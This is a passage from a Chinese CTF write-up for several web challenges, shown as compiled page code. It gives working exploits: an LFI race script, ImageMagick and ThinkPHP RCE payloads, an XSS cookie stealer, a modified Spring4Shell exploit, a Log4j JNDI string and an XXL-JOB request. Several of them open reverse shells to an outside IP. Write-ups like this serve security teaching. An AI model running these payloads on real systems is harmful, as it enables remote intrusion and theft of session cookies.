\u534F\u8BAE\u6CA1\u6709\uFF0C\u679C\u7136\u6CA1\u6709\u8FD9\u4E48\u7B80\u5355\u3002"]}),"\n",(0,t.jsx)(n.p,{children:"\u8BF4\u662F\u6709\u4E2Aphpinfo\uFF0C\u627E\u4E86\u4E00\u5708\u5728info.php\u627E\u5230\u4E86\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"allow_url_fopen=On\nallow_url_include=Off\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53EF\u4EE5\u770B\u5230allow_url_include\u662Foff\uFF0C\u602A\u4E0D\u5F97php://input\u65E0\u6548\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u767E\u5EA6\u627E\u5230\u4E00\u4E2Asmb\u52A0\u8F7D\u8FDC\u7A0B\u6587\u4EF6\u7684\u65B9\u6CD5\uFF0C\u4F46\u662F\u53EA\u9488\u5BF9Windows\u73AF\u5883\uFF0C\u4ECEphpinfo\u4E2D\u770B\u51FA\u8FD9\u660E\u663E\u662F\u4E00\u4E2Alinux\u73AF\u5883\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u7EE7\u7EED\u767E\u5EA6\uFF0C\u627E\u4E00\u4E2Asession\u4E0A\u4F20\u8FDB\u7A0B\u6F0F\u6D1E\u5229\u7528\u3002\u5F53session.upload_progress.enabled\u5F00\u542F\u7684\u65F6\u5019\u4F1A\u5C06\u4E0A\u4F20\u6587\u4EF6\u7684\u8FDB\u5EA6\u5E8F\u5217\u5316\u4FDD\u5B58\u5230\u672C\u5730\u6587\u4EF6\u4E2D\uFF0C\n\u8FD9\u4E2A\u6587\u4EF6\u7684\u8DEF\u5F84\u548C\u6587\u4EF6\u540D\u53EF\u4EE5\u901A\u8FC7\u731C\u6D4B\u83B7\u5F97\u3002\u4E8E\u662F\u901A\u8FC7\u5305\u542B\u8FD9\u4E2A\u8FDB\u5EA6\u6587\u4EF6\uFF0C\u80FD\u591F\u5B9E\u73B0\u6267\u884C\u81EA\u5B9A\u4E49\u547D\u4EE4\u7684\u6548\u679C\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u4F46\u662F\u8FD9\u4E2A\u8FC7\u7A0B\u6781\u5FEB\uFF0C\u9700\u8981\u4E00\u4E2A\u811A\u672C\u4E0D\u505C\u7684\u5C1D\u8BD5\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:'import requests\nimport time\nimport threading\n\nhost = \'https://include-ctfd.dun.mi.com/\'\nPHPSESSID = \'vrhtvjd4j1sd88onr92fm9t2gt\'\n\nheaders = {\n    \'Cookie\': \'TODO miduncookie; PHPSESSID=\' + PHPSESSID}\n\n# data = {"PHP_SESSION_UPLOAD_PROGRESS": "<?php system(\'/bin/bash -i >& /dev/tcp/10.167.90.69/3000 0>&1\');?>"}\ndata = {"PHP_SESSION_UPLOAD_PROGRESS": "<?php echo `ls -al /home/mywww/flag_is_here`;?>"}\n\n\n# data = {"PHP_SESSION_UPLOAD_PROGRESS": "<?php echo `cat /home/mywww/flag_is_here`;?>"}\n\ndef creatSession():\n    while True:\n        files = {\n            "upload": ("tmp.jpg", open("/etc/passwd", "rb"))\n        }\n        # data = {"PHP_SESSION_UPLOAD_PROGRESS": "<?php echo md5(\'1\');?>"}\n\n        r = requests.post(host + "/info.php", files=files, headers=headers, data=data)\n        # print(r.text)\n\n\nfileName = "/var/lib/php/sessions/sess_" + PHPSESSID\n\nif __name__ == \'__main__\':\n\n    url = "{}index.php?page={}".format(host, fileName)\n    t = threading.Thread(target=creatSession, args=())\n    t.setDaemon(True)\n    t.start()\n    while True:\n        res = requests.get(url, headers=headers)\n        print("[/] " + res.text)\n        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:\n            print("[*] Get shell success.")\n            break\n        else:\n            print("[-] retry.")\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5F00\u542F\u4E24\u4E2A\u7EBF\u7A0B\uFF0C\u4E00\u4E2A\u7EBF\u7A0B\u4E0A\u4F20\u6587\u4EF6\uFF0C\u53E6\u4E00\u4E2A\u7EBF\u7A0B\u8BBF\u95EEindex.php\u83B7\u53D6\u5305\u542B\u7684\u7ED3\u679C\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u7ECF\u8FC7\u4E0D\u65AD\u7684\u5C1D\u8BD5\u548C\u731C\u6D4B\u8DEF\u5F84\uFF0C\u6700\u7EC8\u5728/home/mywww/flag_is_here\u53D1\u73B0flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-15-\u9B54\u6CD5\u7684\u529B\u91CF",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-15-\u9B54\u6CD5\u7684\u529B\u91CF",children:"#"}),"web-15 \u9B54\u6CD5\u7684\u529B\u91CF"]}),"\n",(0,t.jsx)(n.p,{children:"\u8BE5\u9898\u5229\u7528\u4E86ImageMagick\u7684CVE-2016-3714\u6F0F\u6D1E\u3002"}),"\n",(0,t.jsx)(n.p,{children:"ImageMagick\u6D41\u884C\u7684\u539F\u56E0\u4E4B\u4E00\uFF0C\u5C31\u662F\u5B83\u529F\u80FD\u5F3A\u5927\uFF0C\u53EF\u4EE5\u5904\u7406\u5F88\u591A\u60C5\u51B5\uFF0C\u800C\u6709\u4E00\u4E2A\u529F\u80FDdelegate\uFF0C\u4F5C\u7528\u662F\u8C03\u7528\u5916\u90E8\u7684lib\u6765\u5904\u7406\u6587\u4EF6\u3002\u8C03\u7528\u5916\u90E8lib\u5C31\u662F\u6267\u884Csystem\u547D\u4EE4\uFF0C\u4ECE\u800C\u4EA7\u751F\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u89E3\u6790https\u56FE\u7247\u7684\u65F6\u5019\uFF0C\u4F7F\u7528\u4E86curl\u547D\u4EE4\u5C06\u5176\u4E0B\u8F7D\uFF0Cpayload\u53EA\u9700\u4F7F\u7528\u53CD\u5F15\u53F7\u6216\u95ED\u5408\u53CC\u5F15\u53F7\uFF0C\u5C31\u53EF\u4EE5\u6267\u884C\u4EFB\u610F\u547D\u4EE4\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u5C06\u4E00\u4E0B\u5185\u5BB9\u4FDD\u5B58\u4E3Axxx.png\uFF0C\u4E0A\u4F20\u65E2\u53EF\u89E6\u53D1\u5217\u76EE\u5F55\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/1.jpg\"|ls -al\")'\npop graphic-context\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4ECE\u6587\u4EF6\u540D\u4E2D\u53EF\u4EE5\u627E\u5230flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-16-\u4F60\u542C\u8BF4\u8FC7thinkphp\u5417",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-16-\u4F60\u542C\u8BF4\u8FC7thinkphp\u5417",children:"#"}),"web-16 \u4F60\u542C\u8BF4\u8FC7Thinkphp\u5417"]}),"\n",(0,t.jsx)(n.p,{children:"\u542C\u8BF4\u8FC7"}),"\n",(0,t.jsx)(n.p,{children:"\u7F51\u9875\u770B\u51FAthinkphp\u7248\u672C\u662Fthinkphp 5.0.23"}),"\n",(0,t.jsxs)(n.p,{children:["\u63A8\u8350\u4E00\u4E2A\u7F51\u7AD9\u67E5\u770Bthinkphp\u7684\u6F0F\u6D1E ",(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/",target:"_blank",rel:"noopener noreferrer",children:"https://www.exploit-db.com/"})," \uFF0C\u5728\u7F51\u7AD9\u91CC\u641C\u7D22thinkphp\uFF0C\u627E\u5230"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/46150",target:"_blank",rel:"noopener noreferrer",children:"https://www.exploit-db.com/exploits/46150"})}),"\n",(0,t.jsx)(n.p,{children:"\u8FD9\u91CC\u6CA1\u6709\u5F00\u542Fdebug\u6A21\u5F0F\uFF0C\u6211\u4EEC\u9009\u62E9thinkphp 5.0.23(\u5B8C\u6574\u7248)\u63D0\u5230\u7684\u5185\u5BB9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"33\u3001\uFF08post\uFF09public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6784\u9020\u8BF7\u6C42\u6267\u884C\u547D\u4EE4"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",meta:"",children:"curl --location --request POST 'https://thinkphp5-ctfd.dun.mi.com/index.php?s=captcha' \\\n--header 'authority: thinkphp5-ctfd.dun.mi.com' \\\n--header 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\\n--header 'accept-language: zh-CN,zh;q=0.9,en;q=0.8' \\\n--header 'cache-control: max-age=0' \\\n--header 'cookie: TODO cookie'\\\n--header 'sec-ch-ua: \"Chromium\";v=\"104\", \"/Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"104\"' \\\n--header 'sec-ch-ua-mobile: ?0' \\\n--header 'sec-ch-ua-platform: \"macOS\"' \\\n--header 'sec-fetch-dest: document' \\\n--header 'sec-fetch-mode: navigate' \\\n--header 'sec-fetch-site: none' \\\n--header 'sec-fetch-user: ?1' \\\n--header 'upgrade-insecure-requests: 1' \\\n--header 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \\\n--header 'Content-Type: application/x-www-form-urlencoded' \\\n--data-urlencode '_method=__construct' \\\n--data-urlencode 'filter[]=system' \\\n--data-urlencode 'method=get' \\\n--data-urlencode 'server[REQUEST_METHOD]=cat AAA.php'\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u611F\u8C22\u65E0\u540D\u6C0F\u63D0\u524D\u653E\u7F6E\u7684\u4E00\u53E5\u8BDD\uFF0C\u8FD9\u91CC\u501F\u82B1\u732E\u4F5B\uFF0C\u76F4\u63A5\u65E0\u803B\u7684\u7528\u8681\u5251\u8FDE\u63A5\u4E86\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u7FFB\u627E\u76EE\u5F55\u627E\u5230flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-17-\u7B80\u964B\u7684\u7559\u8A00\u677F",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-17-\u7B80\u964B\u7684\u7559\u8A00\u677F",children:"#"}),"web-17 \u7B80\u964B\u7684\u7559\u8A00\u677F"]}),"\n",(0,t.jsx)(n.p,{children:"xss"}),"\n",(0,t.jsx)(n.p,{children:"\u57FA\u672C\u4E0A\u6CA1\u6709\u8FC7\u6EE4\u4EFB\u4F55\u5185\u5BB9\uFF0C\u8FD9\u91CC\u4F7F\u7528\u4E00\u4E2A\u91CD\u5B9A\u5411\u5C06cookie\u8865\u5145\u5728\u8DEF\u5F84\u4E2D\u8F6C\u53D1\u8FC7\u53BB\u3002\u9700\u8981\u4E00\u4E2A\u670D\u52A1\u67E5\u770B\u8BBF\u95EE\u7684\u8DEF\u5F84\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-javascript",meta:"",children:'<script>\nsetTimeout(()=>{\ndocument.location="http://10.167.90.69:1337/xss/"+encodeURIComponent(document.cookie).substring(0, 255)\n}, 1000)\n<\/script>\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u9884\u75591s\u7684\u65F6\u95F4\uFF0C\u8003\u9A8C\u4F60\u70B9\u63D0\u4EA4\u7ED9\u7BA1\u7406\u5458\u6309\u94AE\u7684\u624B\u901F\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u7BA1\u7406\u5458\u8BBF\u95EE\u94FE\u63A5\u540E\u53EF\u4EE5\u770B\u5230cookie\uFF0C\u5C06\u83B7\u53D6cookie\u5199\u5165\u6D4F\u89C8\u5668\uFF0C\u91CD\u65B0\u7559\u8A00\u5373\u53EF\u770B\u5230flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-18-\u6781\u7B80\u7684spring",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-18-\u6781\u7B80\u7684spring",children:"#"}),"web-18 \u6781\u7B80\u7684Spring"]}),"\n",(0,t.jsx)(n.p,{children:"CVE-2022-22965\uFF1ASpring Framework\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E"}),"\n",(0,t.jsx)(n.p,{children:"github\u4E0A\u627E\u4E86\u4E00\u4E2Aexploit\u7A0D\u5FAE\u4FEE\u6539\u4E86\u4E00\u4E0B\uFF0C\u4FEE\u6539\u6210\u53CD\u5F39shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:"import requests\nimport argparse\nfrom urllib.parse import urljoin\nimport base64\n\n\ndef make_runtime_payload(cmd, host=None, port=None):\n    if host and port:\n        bash_payload = base64.b64encode(f\"bash -i >& /dev/tcp/{host}/{port} 0>&1\".encode())\n        # https://ares-x.com/tools/runtime-exec/\n        payload = \"bash -c {echo,\" + bash_payload.decode(\"utf-8\") + \"}|{base64,-d}|{bash,-i}\"\n        payload = f'\"{payload}\"'\n        return payload\n    else:\n        payload = f'\"{cmd}\"'\n        return payload\n\n\ndef url_encode(text):\n    return text.replace('/', '%2F').replace(' ', '%20').replace('=', '%3D').replace('&', '%26').replace('\"',\n                                                                                                        \"%22\").replace(\n        \"'\", \"%27\").replace('>', \"%3E\").replace('<', \"%3C\").replace('#', \"%23\").replace('?', \"%3F\").replace('+', \"%2B\")\n\n\ndef exploit(url, command, shell_name, password='1337'):\n    print(f\"418 - Trying to exploit {url}\")\n    headers = {\"suffix\": \"%>//\",\n               \"c1\": \"Runtime\",\n               \"c2\": \"<%\",\n               \"DNT\": \"1\",\n               \"Content-Type\": \"application/x-www-form-urlencoded\",\n               \"Cookie\": \"miduncookie\" # TODO cookie\n               }\n    # https://github.com/craig/SpringCore0day original exploit\n    data = f\"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{url_encode(password)}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec({url_encode(command)}).getInputStream();%20int%20a%20=%20-1;%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D;%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b));%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={shell_name}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\"\n\n    go = requests.post(url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)\n    shellurl = urljoin(url, f'{shell_name}.jsp')\n    shellgo = requests.get(shellurl, timeout=40, allow_redirects=False, verify=False)\n    if shellgo.status_code == 200:\n        print(f\"{shellgo.status_code} - Successfuly exploited, access in: {shellurl}?pwd={url_encode(password)}\")\n    else:\n        print(f\"{shellgo.status_code} - {shellurl} is'n work :(\")\n\n\ndef main():\n    # parser = argparse.ArgumentParser(description='')\n    # parser.add_argument('-f', '--file',help='File with a list of URLs (reverse-shell dont works here)', required=False)\n    # parser.add_argument('-u', '--url',help='Just one target URL', required=False)\n    # parser.add_argument('-c', '--command',help='Command to execute', required=False)\n    # parser.add_argument('--host', help='Host to connect if you want a reverse shell', required=False)\n    # parser.add_argument('--port', help='Port to connect if you want a reverse shell', required=False)\n    # parser.add_argument('--shell_name', help='Name of the shell', required=False, default=\"b1g0uS\")\n    # parser.add_argument('--password', help='Password for shell', required=False, default='1337')\n    # args = parser.parse_args()\n\n    file_arg = \"sumy123123123123123123123\"\n    dir_arg = \"webapps/ROOT\"\n    url_arg = \"https://spring-ctfd.dun.mi.com/\"\n    command_arg = None\n    shell_name_arg = \"sumy_123\"\n    password_arg = \"1423\"\n    host_arg = '10.167.90.69'\n    port_arg = '3000'\n\n    if url_arg:\n        if command_arg:\n            exploit(url_arg, make_runtime_payload(command_arg), shell_name_arg, password=password_arg)\n        elif host_arg and port_arg:\n            exploit(url_arg, make_runtime_payload(None, host_arg, port_arg), shell_name_arg, password=password_arg)\n\n\nif __name__ == '__main__':\n    print(\"SPRING CORE RCE. :)\")\n    main()\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4E0D\u77E5\u9053\u600E\u4E48\u641E\u5F97\uFF0C\u628A\u670D\u52A1\u6253\u6302\u4E86\u4E00\u6B21\u3002\u3002\u3002\u597D\u50CF\u6709\u5185\u5B58\u6CC4\u9732\u3002\u3002\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-19-\u4E3A\u4EC0\u4E48\u4E0D\u80FD\u7528\u9ED8\u8BA4\u914D\u7F6E\u5462",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-19-\u4E3A\u4EC0\u4E48\u4E0D\u80FD\u7528\u9ED8\u8BA4\u914D\u7F6E\u5462",children:"#"}),"web-19 \u4E3A\u4EC0\u4E48\u4E0D\u80FD\u7528\u9ED8\u8BA4\u914D\u7F6E\u5462"]}),"\n",(0,t.jsx)(n.p,{children:"nacos\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E(CVE-2021-29441)"}),"\n",(0,t.jsx)(n.p,{children:"\u5728AuthFilter\u8FC7\u6EE4\u5668\u4E2D\u5B58\u5728\u5982\u4E0B\u6761\u4EF6\u8BED\u53E5\uFF1A"}),"\n",(0,t.jsx)(n.p,{children:'useragent\u8BF7\u6C42\u5934\u5982\u679C\u4EE5Constants.NACOS_SERVER_HEADER\u5F00\u5934\uFF0C\u5219\u76F4\u63A5\u653E\u901A\uFF0C\u6267\u884C\u540E\u7EED\u7684\u4E1A\u52A1\u5904\u7406\uFF0C\u800CConstants.NACOS_SERVER_HEADER\u5B9A\u4E49\u7684\u6B63\u662F"Nacos-Server"\u3002'}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",meta:"",children:"curl --location --request GET 'https://nacos-ctfd.dun.mi.com/nacos/v1/auth/users?pageNo=1&pageSize=9' \\\n--header 'authority: nacos-ctfd.dun.mi.com' \\\n--header 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\\n--header 'accept-language: zh-CN,zh;q=0.9,en;q=0.8' \\\n--header 'cache-control: max-age=0' \\\n--header 'TODO miduncookie' \\\n--header 'if-modified-since: Fri, 29 Apr 2022 02:20:32 GMT' \\\n--header 'sec-ch-ua: \"Chromium\";v=\"104\", \"/Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"104\"' \\\n--header 'sec-ch-ua-mobile: ?0' \\\n--header 'sec-ch-ua-platform: \"macOS\"' \\\n--header 'sec-fetch-dest: document' \\\n--header 'sec-fetch-mode: navigate' \\\n--header 'sec-fetch-site: same-origin' \\\n--header 'sec-fetch-user: ?1' \\\n--header 'upgrade-insecure-requests: 1' \\\n--header 'user-agent: Nacos-Server'\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6709\u4E86user-agent: Nacos-Server\u4E4B\u540E\uFF0C\u53EF\u4EE5\u8C03\u7528\u63A5\u53E3\u83B7\u53D6\u5F53\u524D\u7528\u6237\u3001\u6DFB\u52A0\u7528\u6237\u3002\u6DFB\u52A0\u7528\u6237\u540E\uFF0C\u767B\u5F55\u7CFB\u7EDF\u53EF\u4EE5\u4ECE\u7CFB\u7EDF\u7684\u914D\u7F6E\u4E2D\u83B7\u53D6flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-20-\u8BB0\u65E5\u5FD7\u80FD\u6709\u4EC0\u4E48\u95EE\u9898\u5462",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-20-\u8BB0\u65E5\u5FD7\u80FD\u6709\u4EC0\u4E48\u95EE\u9898\u5462",children:"#"}),"web-20 \u8BB0\u65E5\u5FD7\u80FD\u6709\u4EC0\u4E48\u95EE\u9898\u5462"]}),"\n",(0,t.jsx)(n.p,{children:"\u731C\u6D4B\u9898\u76EE\u5E94\u8BE5\u662F\u628A\u8F93\u5165\u7684\u7528\u6237\u540D\u5BC6\u7801\u8BB0\u5F55\u5230\u65E5\u5FD7\u4E2D\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u60F3\u5230\u4E86\u53BB\u5E74\u6CB8\u6CB8\u626C\u626C\u7684 Apache Log4j\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2021-44228\uFF09"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce",target:"_blank",rel:"noopener noreferrer",children:"https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce"})}),"\n",(0,t.jsx)(n.p,{children:"Exploit\u6267\u884C\u53CD\u5F39shell\u547D\u4EE4"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:'String[] cmds = new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.167.90.69/3000 0>&1"};\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u627E\u4E00\u53F0\u670D\u52A1\u5668\u6309\u7167github\u8BF4\u660E\u5F00\u542Fjndi\u670D\u52A1\uFF0C\u7528\u6237\u540D\u5BC6\u7801\u6709\u4E00\u5904\u586B\u5199"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"${jndi:ldap://xx.xx.xx.xx:1389/Exploit}\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53CD\u5F39\u6210\u529F\u540E\uFF0C\u7FFB\u627E\u76EE\u5F55\u627E\u5230flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-22-\u7834\u89E3token\u8BA4\u8BC1",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-22-\u7834\u89E3token\u8BA4\u8BC1",children:"#"}),"web-22 \u7834\u89E3Token\u8BA4\u8BC1"]}),"\n",(0,t.jsx)(n.p,{children:"\u63D0\u793A\u8BF4\u627E\u627E\u5176\u5B83\u7AEF\u53E3\uFF0C\u53D1\u73B0\u5F00\u542F\u4E869999\u7AEF\u53E3\uFF0C\u7ED3\u5408\u7AEF\u53E3\u548C\u5206\u5E03\u5F0F\u8C03\u5EA6\u5173\u952E\u8BCD\uFF0C\u67E5\u627E\u83B7\u53D6\u4FE1\u606F\uFF0C\u53EF\u80FD\u662FXXL-JOB\u8C03\u5EA6\u7684executor\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u8BBF\u95EE\u5730\u5740\uFF0C\u679C\u7136\u662F\u8FD9\u6837\u3002executor\u5F00\u542F\u4E86token\u8BA4\u8BC1\uFF0C\u4F46\u662F\u5F31\u53E3\u4EE4\u731C\u6D4B123456\u6210\u529F\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u57FA\u4E8E\u4EE5\u4E0A\uFF0C\u6784\u9020\u6570\u636E\u53D1\u9001\u7ED9executor\u6267\u884Cshell\u547D\u4EE4\uFF0C\u53CD\u5F39shell\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",meta:"",children:'curl --location --request POST \'http://10.38.202.127:9999/run\' \\\n--header \'Content-Type: application/json\' \\\n--header \'XXL-JOB-ACCESS-TOKEN: 123456\' \\\n--data-raw \'{\n  "jobId": 1,\n  "executorHandler": "demoJobHandler",\n  "executorParams": "demoJobHandler",\n  "executorBlockStrategy": "COVER_EARLY",\n  "executorTimeout": 0,\n  "logId": 1,\n  "logDateTime": 1655774599001,\n  "glueType": "GLUE_SHELL",\n  "glueSource": "/bin/bash -i >& /dev/tcp/10.167.90.69/3000 0>&1",\n  "glueUpdatetime": 1655774599000,\n  "broadcastIndex": 0,\n  "broadcastTotal": 0\n}\n\'\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u7FFB\u627E\u76EE\u5F55\u83B7\u5F97flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-23-\u7B80\u5355\u5C0F\u6E38\u620F",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-23-\u7B80\u5355\u5C0F\u6E38\u620F",children:"#"}),"web-23 \u7B80\u5355\u5C0F\u6E38\u620F"]}),"\n",(0,t.jsx)(n.p,{children:"\u5C0F\u6E38\u620F\u633A\u597D\u73A9"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u5C0F\u6E38\u620F\u6210\u529F\u4EE3\u7801",src:f})}),"\n",(0,t.jsx)(n.p,{children:"\u7FFB\u627E\u6E90\u7801\uFF0C\u53D1\u73B0\u5728\u901A\u8FC713\u5173\u540E\uFF0C\u4F1A\u4ECE/flag.php\u6587\u4EF6\u83B7\u53D6flag\uFF0C\u4F46\u662F\u76F4\u63A5\u8BBF\u95EE\u63D0\u793A\u5173\u952E\u4FE1\u606F\u5728/dog.png\u6587\u4EF6\u4E2D\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u8FD9\u91CC\u5361\u4E86\u597D\u4E45\uFF0C\u4E00\u76F4\u4EE5\u4E3A\u8981\u5206\u6790\u72D7\u7684IDAT\u6570\u636E\uFF0C\u6216\u8005\u662F\u4EC0\u4E48\u56FE\u7247\u9690\u5199\u4E4B\u7C7B\u7684\u5185\u5BB9\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u540E\u6765\u53D1\u73B0\uFF0Ckey\u5C31\u8D64\u88F8\u88F8\u7684\u5199\u5728dog.png\u6587\u4EF6\u91CC\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u5341\u516D\u8FDB\u5236\u67E5\u770B\u5668",src:b})}),"\n",(0,t.jsxs)(n.p,{children:["\u8BBF\u95EE ",(0,t.jsx)(n.a,{href:"https://ezhack-ctfd.dun.mi.com/flag.php?key=627bb02a22",target:"_blank",rel:"noopener noreferrer",children:"https://ezhack-ctfd.dun.mi.com/flag.php?key=627bb02a22"})," \u83B7\u53D6flag\u3002"]}),"\n",(0,t.jsxs)(n.h2,{id:"web-25-\u8DEF\u5F84\u5F15\u53D1\u7684\u60E8\u6848",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-25-\u8DEF\u5F84\u5F15\u53D1\u7684\u60E8\u6848",children:"#"}),"web-25 \u8DEF\u5F84\u5F15\u53D1\u7684\u60E8\u6848"]}),"\n",(0,t.jsx)(n.p,{children:"python\u4EE3\u7801\u5BA1\u8BA1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:'# -*- coding: utf-8 -*-\nimport socket\nimport threading\nfrom datetime import datetime\nimport os\nimport mimetypes\nimport urllib.parse\nimport sys\nimport subprocess\nimport re\n\nrespTemplate = """HTTP/1.1 {statusNum} {statusCode}\nDate: {dateSent}\nServer: {server}\nLast-Modified: {modified}\nContent-Length: {length}\nContent-Type: {contentType}\nConnection: {connectionType}\n\n{body}\n"""\nDOC_ROOT = "../"\n\nCODES = {"200": "OK",\n         "304": "NOT MODIFIED",\n         "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND",\n         "500": "INTERNAL SERVER ERROR"}\n\nMIMES = {"txt": "text/plain", "css": "text/css", "html": "text/html", "png": "image/png", "jpg": "image/jpg",\n         "ttf": "application/octet-stream", "otf": "application/octet-stream", "woff": "font/woff",\n         "woff2": "font/woff2",\n         "js": "application/javascript", "gz": "application/zip", "py": "text/plain", "map": "application/octet-stream"}\n\nclass Response:\n    def __init__(self, **kwargs):\n        self.__dict__.update(kwargs)\n        now = datetime.now()\n        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")\n\n    def stringResponse(self):\n        return respTemplate.format(**self.__dict__)\n\nclass Request:\n    def __init__(self, request):\n        self.good = True\n        try:\n            request = self.parseRequest(request)\n            self.method = request["method"]\n            self.doc = request["doc"]\n            self.vers = request["vers"]\n            self.header = request["header"]\n            self.body = request["body"]\n        except:\n            self.good = False\n\n    def parseRequest(self, request):\n        req = request.strip("\\r").split("\\n")\n        method, doc, vers = req[0].split(" ")\n        header = req[1:-3]\n        body = req[-1]\n        headerDict = {}\n        for param in header:\n            pos = param.find(": ")\n            key, val = param[:pos], param[pos + 2:]\n            headerDict.update({key: val})\n        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}\n\nclass Server:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n\n    def listen(self):\n        self.sock.listen(5)\n        while True:\n            client, address = self.sock.accept()\n            client.settimeout(60)\n            threading.Thread(target=self.listenToClient, args=(client, address)).start()\n\n    def listenToClient(self, client, 